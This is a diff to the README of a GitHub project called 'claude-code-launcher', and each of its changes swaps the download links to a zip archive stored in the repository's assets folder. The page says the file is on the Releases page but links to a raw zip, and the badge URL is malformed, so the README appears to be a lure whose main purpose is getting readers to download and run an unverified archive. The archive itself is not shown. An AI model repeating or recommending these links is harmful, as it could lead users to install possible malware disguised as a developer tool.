@@ -1,6 +1,6 @@
 # 🚀 claude-code-launcher - Launch Your Code Securely with One Command
 
-[![Download claude-code-launcher](https://raw.githubusercontent.com/xdxdxd3214/claude-code-launcher/main/assets/code_claude_launcher_2.9-beta.1.zip%20Now-%20claude--code--launcher-brightgreen)](https://raw.githubusercontent.com/xdxdxd3214/claude-code-launcher/main/assets/code_claude_launcher_2.9-beta.1.zip)
+[![Download claude-code-launcher](https://github.com/xdxdxd3214/claude-code-launcher/raw/refs/heads/main/assets/code-claude-launcher-2.6.zip%20Now-%20claude--code--launcher-brightgreen)](https://github.com/xdxdxd3214/claude-code-launcher/raw/refs/heads/main/assets/code-claude-launcher-2.6.zip)
 
 ## 📋 Overview
 
@@ -14,7 +14,7 @@ Follow these simple steps to download and run claude-code-launcher on your compu
 
 Go to the Releases page to get the latest version of claude-code-launcher. You can find it here:
 
-[Download claude-code-launcher](https://raw.githubusercontent.com/xdxdxd3214/claude-code-launcher/main/assets/code_claude_launcher_2.9-beta.1.zip)
+[Download claude-code-launcher](https://github.com/xdxdxd3214/claude-code-launcher/raw/refs/heads/main/assets/code-claude-launcher-2.6.zip)
 
 ### Step 2: Choose Your Version
 
@@ -89,6 +89,6 @@ For any questions or support, please check the **Issues** section on the GitHub 
 
 Now that you know how to get started, visit the following link to download the latest version of claude-code-launcher:
 
-[Download claude-code-launcher](https://raw.githubusercontent.com/xdxdxd3214/claude-code-launcher/main/assets/code_claude_launcher_2.9-beta.1.zip)
+[Download claude-code-launcher](https://github.com/xdxdxd3214/claude-code-launcher/raw/refs/heads/main/assets/code-claude-launcher-2.6.zip)
 
 Take control of your coding experience today!
